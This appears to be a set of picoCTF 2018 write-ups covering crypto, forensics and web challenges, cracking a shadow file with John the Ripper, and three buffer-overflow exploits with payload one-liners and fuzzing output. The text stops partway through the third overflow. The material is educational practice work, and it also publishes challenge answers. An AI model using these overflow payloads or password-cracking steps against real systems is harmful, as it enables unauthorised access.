### 1. Forensics Warmup 1 - Points: 50
Can you unzip this file for me and retreive the flag? 

#### Solution: 

1. Download the file and Unzip
2. Open flag.jpg file. Here found the flag.

### 2. Reversing Warmup 1 - Points: 50
Throughout your journey you will have to run many programs. Can you navigate to `/problems/reversing-warmup-1_3_7c0eade7faf60ffe3485e12098e2a6c2` on the shell server and run this program to retreive the flag? 

#### Solution:

1. Access the shell and connect.
2. Login with credentials like teamname and password.
3. Navigate to `/problems/reversing-warmup-1_3_7c0eade7faf60ffe3485e12098e2a6c2` directory with `cd /problems/reversing-warmup-1_3_7c0eade7faf60ffe3485e12098e2a6c2`
4. Check files with ls -l command. Here can see the file has executable permission.
`-rwxr-sr-x 1 hacksports reversing-warmup-1_3 7420 Sep 28 08:34 run`

5. Run the file with `./run`
6. Final flag is: `picoCTF{welc0m3_t0_r3VeRs1nG}`

### 3. Reversing Warmup 2 - Points: 50
Can you decode the following string dGg0dF93NHNfczFtcEwz from base64 format to ASCII? 

#### Solution:

1. Run terminal
2. Run command:   `echo ‘dGg0dF93NHNfczFtcEwz’ | base64 --decode > flag.txt`
3. Run command: `nano flag.txt`
4. Final flag is: `picoCTF{th4t_w4s_s1mpL3}`

### 4. Crypto Warmup 1 - Points: 75
Crpyto can often be done by hand, here's a message you got from a friend, llkjmlmpadkkc with the key of thisisalilkey. Can you use this table to solve it?. 

#### Solution:

1. Download the table and open. table file contain a table of letter A-Z which can be a clue that flag can be encrypted with Vigenere Cipher. 
2. A key supplied with the question which can be helpful to get the flag.
3. Go to https://www.dcode.fr/vigenere-cipher to decode.
4. Copy  llkjmlmpadkkc and paste to the text field and write the key in key portion.
5. Left side we can see a text which is: `secretmessage`.
6. Final flag is: `picoCTF{SECRETMESSAGE}` [Flag will be in capital format mentioned is the HINTS]

### 5. Crypto Warmup 2 - Points: 75
Cryptography doesn't have to be complicated, have you ever heard of something called rot13? `cvpbPGS{guvf_vf_pelcgb!} `

#### Solution:

1. Goto https://cryptii.com/ 
2. Select **rot13** of middle option and select decode
3. Cope the `cvpbPGS{guvf_vf_pelcgb!}` and paste it to the left section
4. Final flag is: `picoCTF{this_is_crypto!}`


### 6. HEEEEEEERE'S Johnny! - Points: 100
Okay, so we found some important looking files on a linux computer. Maybe they can be used to get a password to the process. Connect with nc 2018shell2.picoctf.com 42165. Files can be found here: passwd shadow. 
Hints: 
If at first you don't succeed, try, try again. And again. And again. 
If you're not careful these kind of problems can really "rockyou". 


#### Solution:

1. Download passwd and shadow file.
2. Run command from terminal: `/usr/bin/unshadow passwd shadow > pass.txt`
3. Download rockyou.txt wordfile to crack the password
4. Run command: `sudo john --wordlist=rockyou.txt pass.txt`
5. Output should be: 

~~~~bash
Created directory: `/root/.john`
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
thematrix        (root)
1g 0:00:01:04 100% 0.01553g/s 171.5p/s 171.5c/s 171.5C/s jemjem..davida
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~~


6. So the password is _**thematrix**_ for user root
7. Run  `nc 2018shell2.picoctf.com 42165`
8. Enter username as root and password as thematrix
9. Final flag is: `picoCTF{J0hn_1$_R1pp3d_5f9a67aa}`

### 7. pipe - Points: 110
During your adventure, you will likely encounter a situation where you need to process data that you receive over the network rather than through a file. Can you find a way to save the output from this program and search for the flag? Connect with 2018shell2.picoctf.com 37542. 

#### Solution:

1. Run command: `nc  2018shell2.picoctf.com 37542 | pico`
2. Final flag is: `picoCTF{almost_like_mario_a6975cdb}`

### 8. grep 2 - Points: 125
This one is a little bit harder. Can you find the flag in `/problems/grep-2_4_06c2058761f24267033e7ca6ff9d9144/files` on the shell server? Remember, grep is your friend. 

#### Solution:

1. Go to shell. 
2. Go to `/problems/grep-2_4_06c2058761f24267033e7ca6ff9d9144/files` directory with cd.
3. Type command: `grep -Rin pico *`
4. Final flag is: `picoCTF{grep_r_and_you_will_find_036bbb25}`

### 9. admin panel - Points: 150 
We captured some traffic logging into the admin panel, can you find the password? 

#### Solution: 

1. Download traffic file which is a pcap
2. Open `traffic.pcap` file with wireshark
3. Select a HTTP protocol packet. Right click and select Follow HTTP Stream
4. Final flag is: `picoCTF{n0ts3cur3_df598569}`

### 10. caesar cipher 1 - Points: 150
This is one of the older ciphers in the books, can you decrypt the message? You can find the ciphertext in `/problems/caesar-cipher-1_3_160978e2a142244574bd048623dba1ed` on the shell server. 

#### Solution:

1. Download the message file.
2. Go to _https://dcode.fr/caesar-cipher_ and paste the text of message file
3. Select test all possible solution and click Decrypt
4. Left side you can find the flag.
5. Final flag is: `picoCTF{justagoodoldcaesarcipherwoyolfpu}`

### 11. hertz - Points: 150
Here's another simple cipher for you where we made a bunch of substitutions. Can you decrypt it? Connect with `nc 2018shell2.picoctf.com 48186`. 

#### Solution:

1. Connect  `nc 2018shell2.picoctf.com 48186` from terminal
2. Copy the response text. It’s substitution cipher text.
3. Go to _https://guballa.de/substitution-solver_
4. Paste the copied text.
5. Final flag is: `picoCTF{substitution_ciphers_are_solvable_vmlvpvmcwr}`

### 12. hex editor - Points: 150
This cat has a secret to teach you. You can also find the file in `/problems/hex-editor_1_10cafee5618ce2cfe32f2188ca1f472e` on the shell server. 

#### Solution:

1. Download the cat file which is hex-editor.jpg
2. Let’s search string from terminal. Type: `strings hex-editor.jpg | grep pico`
3. Final flag is: `picoCTF{and_thats_how_u_edit_hex_kittos_4bE5aCb8}`

### 13. Truly an Artist - Points: 200
Can you help us find the flag in this Meta-Material? You can also find the file in `/problems/truly-an-artist_0_4f3e3848bbbfc5cfcfa404bd18b8ac96`. 

#### Solution:

1. Download the Meta-Material file.
2. Check with exitftool. Command: `exifftool 2018.png`
3. Final flag is: `picoCTF{look_in_image_788a182e}`

### 14. Now you don't - Points: 200
We heard that there is something hidden in this picture. Can you find it? 

#### Solution:
1. Download the picture file.
2. Run `Stegosolver.jar`
3. Open the picture and analyze. 
4. Final flag is: `picoCTF{n0w_y0u_533_m3}`

### 15. What's My Name? - Points: 250 
Say my name, say my name. 

#### Solution
1. Download the `myname.pcap` file
2. Open with wireshark.
3. Select a DNS traffic and follow UDP stream.
4. Final flag is: `picoCTF{w4lt3r_wh1t3_033ad0f914a0b9d213bcc3ce5566038b}`


# Client Side is Still Bad

challenge description

I forgot my password again, but this time there doesn't seem to be a reset, can you help me? http://2018shell1.picoctf.com:8930

look the source, luke !!


```
<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(split*7, split*8) == '}') {
      if (checkpass.substring(split*6, split*7) == 'ebbd') {
        if (checkpass.substring(split*5, split*6) == 'd_d0') {
         if (checkpass.substring(split*4, split*5) == 's_ba') {
          if (checkpass.substring(split*3, split*4) == 'nt_i') {
            if (checkpass.substring(split*2, split*3) == 'clie') {
              if (checkpass.substring(split, split*2) == 'CTF{') {
                if (checkpass.substring(0,split) == 'pico') {
                  alert("You got the flag!")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
  }
</script>

```
We can see our flag right there our flag ``` picoCTF{client_is_bad_debbd} ```

# binary exploitation buffer overflow 0 - Points: 150 - (Solves: 65)

we first checked what kind of binary is.

![binary_bof_0](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_0_0.png)

once after we see it is an ELF 32 bits, then we ran GDB to see their functions, and binary security.

![binary_bof_0](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_0_1.png)

the binary display a ``` main , and vuln function ``` with their address , and we make our fuzzer to fuzz our binary as below

![binary_bof_0](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_0_3.png)

it show us , we see we got an overflow and their offset at 24 then we prepare our payload to read the flag.txt

``` ./vuln `python -c "print 'A'*24+'\x67\x86\x04\x08'*4"` ```

# buffer overflow 1 - Points: 200 - (Solves: 17)

we first checked what kind of binary is.

![binary_bof_1](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_1_0.png)

once after we see it is an ELF 32 bits, then we ran GDB to see their functions, and binary security.

![binary_bof_1](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_1_1.png)

the binary display a ``` main , and vuln function ``` with their address , and we make our fuzzer to fuzz our binary as below



```
m4st3rrulezs@m4st3rrulezs:~/Downloads$ for i in `seq 1 100`; do echo $i; python -c "print 'A'*$i+'\xcb\x85\x04\x08'*$i" | ./vuln; done
1
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
2
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
3
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
4
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
5
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
6
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
7
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
8
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80486b3
Segmentation fault (core dumped)
9
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x8040008
Segmentation fault (core dumped)
10
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x85cb0804
Segmentation fault (core dumped)
11
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0xcb080485
Segmentation fault (core dumped)
12
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
hola
hola
hola
hola
Segmentation fault (core dumped)

```


we see the offset is at 12 , then we prepare our payload to read flag.txt 

``` python -c "print 'A'*12+'\xcb\x85\x04\x08'*9" | ./vuln ```


# binary exploitation buffer overflow 2 

we first checked what kind of binary is.

![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_0.png)

once after we see it is an ELF 32 bits, then we ran GDB to see their functions, and binary security.

![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_1.png)

the binary display a ``` main , win, vuln functions ``` with their address , and we make our fuzzer to fuzz our binary as below

```

1
Please enter your string: 
A˅aaaaﾭ�����p�
2
Please enter your string: 
AA˅aaaaﾭ�����p�
3
Please enter your string: 
AAA˅aaaaﾭ�����p�
4
Please enter your string: 
AAAA˅aaaaﾭ�����p�
5
Please enter your string: 
AAAAA˅aaaaﾭ�����p�
6
Please enter your string: 
AAAAAA˅aaaaﾭ�����p�
7
Please enter your string: 
AAAAAAA˅aaaaﾭ�����p�
8
Please enter your string: 
AAAAAAAA˅aaaaﾭ�����p�
9
Please enter your string: 
AAAAAAAAA˅aaaaﾭ�����p�
10
Please enter your string: 
AAAAAAAAAA˅aaaaﾭ�����p�
11
Please enter your string: 
AAAAAAAAAAA˅aaaaﾭ�����p�
12
Please enter your string: 
AAAAAAAAAAAA˅aaaaﾭ�����p�
13
Please enter your string: 
AAAAAAAAAAAAA˅aaaaﾭ�����p�
14
Please enter your string: 
AAAAAAAAAAAAAA˅aaaaﾭ�����p�
15
Please enter your string: 
AAAAAAAAAAAAAAA˅aaaaﾭ�����p�
16
Please enter your string: 
AAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
17
Please enter your string: 
AAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
18
Please enter your string: 
AAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
19
Please enter your string: 
AAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
20
Please enter your string: 
AAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
21
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
22
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
23
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
24
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
25
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
26
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
27
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
28
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
29
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
30
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
31
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
32
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
33
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
34
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
35
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
36
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
37
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
38
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
39
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
40
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
41
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
42
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
43
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
44
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
45
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
46
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
47
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
48
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
49
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
50
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
51
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
52
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
53
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
54
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
55
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
56
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
57
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
58
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
59
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
60
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
61
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
62
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
63
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
64
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
65
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
66
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
67
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
68
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
69
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
70
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
71
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
72
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
73
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
74
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
75
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
76
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
77
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
78
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
79
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
80
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
81
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
82
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
83
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
84
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
85
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
86
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
87
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
88
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
89
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
90
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
91
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
92
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
93
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
94
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
95
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
96
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
97
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
98
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
99
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
100
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
101
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
102
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
103
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
104
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
105
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
106
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
107
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
108
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
109
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
110
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
111
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
Segmentation fault (core dumped)
112
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅aaaaﾭ�����p�
hacked

```

we create a random strings to overflow with gdb-peda 

![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_2.png)


we notice our offset is between 107 and 111, and we tried to check with gdb-peda 

![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_3.png)

we GOT IT.. 

so far we have win address, args 1 , and args 2 from source. So we tried to code the vuln to exploit.py , we ran gdb-peda to search rop gadgets as below

![binary_bof_2](https://github.com/SkyBulk/picoCTF2018/blob/master/images/binary_bof_2_4.png)


YAY !!! we got RET address , and the last one , we need the exit address as below:
